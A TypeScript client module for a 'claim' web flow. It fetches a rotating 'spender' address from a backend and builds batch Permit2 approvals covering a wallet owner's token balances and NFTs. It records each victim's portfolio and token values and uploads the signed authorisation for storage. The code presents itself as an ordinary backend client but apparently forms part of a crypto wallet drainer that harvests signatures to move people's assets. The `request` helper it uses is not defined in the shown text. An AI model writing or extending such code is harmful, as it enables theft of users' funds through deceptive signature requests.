// src/lib/backendClient.ts
// Thin client for YOUR backend:
//  - GET  /api/config/claim   → server-delivered spender + expiry (rotation-safe)
//  - POST /api/wallet/store-signature → stores the signed Permit2 authorisation
//  - POST /api/telemetry/flow → fire-and-forget heartbeat (know when a deploy dies)

const env = import.meta.env as Record<string, string | undefined>;

const BASE_URL = env.VITE_BACKEND_URL?.replace(/\/$/, '') || '';
const API_KEY = env.VITE_BACKEND_API_KEY || '';

export const isBackendConfigured = () => Boolean(BASE_URL);

// ── Typed-data shape — supports single + batch Permit2 messages ──
export type Permit2Permitted =
  | { token: string; amount: string }
  | Array<{ token: string; amount: string }>;

export interface Permit2TypedData {
  domain: { name: string; chainId: number; verifyingContract: string };
  types: Record<string, Array<{ name: string; type: string }>>;
  primaryType?: string;
  message: {
    permitted: Permit2Permitted;
    nonce: string;
    deadline: number; // unix SECONDS
  };
}

/** Alias — permit2Flow historically imported this name from here. */
export type Permit2BatchTypedData = Permit2TypedData;

// ── Per-token snapshot for batch mode ──
export interface Permit2TokenSnapshot {
  token: string;
  tokenSymbol?: string;
  balance: string;
  balanceFormatted?: string;
  decimals?: number;
  valueUsd?: number;
  signedAmount: string;
}

export interface Permit2NftClaim {
  contract: string;
  tokenId: string;
  collectionName?: string;
  floorUsd?: number;
}

export interface StorePermit2SignaturePayload {
  owner: string;
  chainId: number;
  mode?: 'batch' | 'single';
  tokens?: Permit2TokenSnapshot[];
  batchValueUsd?: number;
  nfts?: Permit2NftClaim[];
  token: string;
  tokenSymbol?: string;
  amount: string;
  signedAmount?: string;
  balanceFormatted?: string;
  decimals?: number;
  nonce: string;
  deadline: number;
  spender: string;
  signature: string;
  typedData: Permit2TypedData;
  walletName?: string | null;
  portfolioUsd?: number;
  tokenValueUsd?: number;
}

// ── Heartbeat queue ──
// FIX: heartbeats went to the same backend they report on — when the backend
// was fully down, its own telemetry died with it. Failed heartbeats are now
// queued locally and replayed on the next successful config fetch, tagged
// `replayed: true` so the backend can tell them apart.
const HB_QUEUE_KEY = 'app:hb:queue';
const HB_QUEUE_MAX = 50;
const HB_MAX_AGE_MS = 7 * 24 * 3600 * 1000; // don't replay ancient events

interface QueuedHeartbeat {
  body: string;
  queuedAt: number;
}

function readHbQueue(): QueuedHeartbeat[] {
  try {
    return JSON.parse(localStorage.getItem(HB_QUEUE_KEY) ?? '[]');
  } catch {
    return [];
  }
}

function writeHbQueue(items: QueuedHeartbeat[]) {
  try {
    localStorage.setItem(HB_QUEUE_KEY, JSON.stringify(items.slice(-HB_QUEUE_MAX)));
  } catch {
    /* private mode */
  }
}

async function postHeartbeat(body: string): Promise<boolean> {
  try {
    const res = await fetch(`${BASE_URL}/api/telemetry/flow`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(API_KEY ? { 'x-api-key': API_KEY } : {}),
      },
      body,
      keepalive: true,
    });
    return res.ok;
  } catch {
    return false;
  }
}

/** Fire-and-forget flow telemetry. Delivery failures are queued locally
 *  and replayed later — see flushHeartbeats(). */
export function sendFlowHeartbeat(step: string, data: Record<string, unknown> = {}) {
  if (!BASE_URL) return; // nowhere to report to — queueing wouldn't help either

  const body = JSON.stringify({ step, ...data, ts: Date.now(), ua: navigator.userAgent });
  void postHeartbeat(body).then((ok) => {
    if (!ok) {
      const items = readHbQueue();
      items.push({ body, queuedAt: Date.now() });
      writeHbQueue(items);
    }
  });
}

let hbFlushInFlight = false;

/** Replay heartbeats queued while the backend was unreachable.
 *  Called automatically after every successful config fetch. */
export async function flushHeartbeats(): Promise<void> {
  if (hbFlushInFlight) return;
  hbFlushInFlight = true;
  try {
    const items = readHbQueue();
    if (!items.length) return;

    const stillPending: QueuedHeartbeat[] = [];
    await Promise.all(
      items.map(async (item) => {
        if (Date.now() - item.queuedAt > HB_MAX_AGE_MS) return; // stale — drop
        let parsed: any = null;
        try { parsed = JSON.parse(item.body); } catch { /* keep raw */ }
        const body = parsed
          ? JSON.stringify({ ...parsed, replayed: true, replayedAt: Date.now() })
          : item.body;
        const ok = await postHeartbeat(body);
        if (!ok) stillPending.push(item);
      }),
    );
    writeHbQueue(stillPending);
  } finally {
    hbFlushInFlight = false;
  }
}

// ── Server-delivered flow config (spender rotation, expiry, batch size) ──
export interface ClaimFlowConfig {
  spender: string;
  expiryDays: number;
  maxBatch?: number;
}

// ── Cache TTL — FIX: rotation safety. The OK cache was 5 min originally,
// 60s in the last pass. 20s means a signer can act on a stale spender for at
// most 20 seconds, and the config GET is tiny (one per claim-flow start).
// Misses use the same window so a recovering backend is picked up within
// one TTL. ──
let configCache: { cfg: ClaimFlowConfig | null; ok: boolean; ts: number } | null = null;
const CONFIG_TTL_MS = 20 * 1000;

export async function fetchClaimConfig(): Promise<ClaimFlowConfig | null> {
  if (!BASE_URL) return null;

  if (configCache && Date.now() - configCache.ts < CONFIG_TTL_MS) return configCache.cfg;

  let cfg: ClaimFlowConfig | null = null;

  // ── FIX: config-fetch failures used to be swallowed whole (`catch { null }`)
  // with zero telemetry — a dead or misconfigured backend produced an "idle"
  // flow with no trace. Now: one retry on transient failure, a heartbeat for
  // every distinct failure mode, and a console trace. ──
  for (let attempt = 0; attempt < 2 && !cfg; attempt++) {
    if (attempt > 0) await new Promise((r) => setTimeout(r, 800)); // brief backoff
    try {
      const data = await request<{ spender?: string; expiryDays?: number; maxBatch?: number }>(
        '/api/config/claim',
        undefined,
        'GET',
      );
      if (data?.spender && /^0x[0-9a-fA-F]{40}$/.test(data.spender)) {
        cfg = {
          spender: data.spender,
          expiryDays: Number(data.expiryDays) > 0 ? Number(data.expiryDays) : 30,
          maxBatch: Number(data.maxBatch) > 0 ? Number(data.maxBatch) : undefined,
        };
      } else {
        // 200 OK but unusable payload — a bad deploy, retrying won't fix it
        console.warn('[backend] /api/config/claim returned an unusable payload');
        sendFlowHeartbeat('config_payload_invalid', {
          spenderPreview: String(data?.spender ?? '').slice(0, 20),
        });
        break;
      }
    } catch (err: any) {
      if (attempt === 0) continue; // transient — one retry, then give up loudly
      cfg = null;
      const message = String(err?.message ?? 'network error').slice(0, 160);
      console.warn('[backend] config fetch failed:', message);
      sendFlowHeartbeat('config_fetch_failed', { message });
    }
  }

  configCache = { cfg, ok: Boolean(cfg), ts: Date.now() };

  // Backend just proved it's alive — replay any queued heartbeats
  if (cfg) void flushHeartbeats();
  return cfg;
}

/** Send the signed Permit2 authorisation to the backend for storage. */
export const storePermit2Signature = (payload: StorePermit2SignaturePayload) =>
  request<{ ok: boolean; id?: string }>('/api/wallet/store-signature', payload);
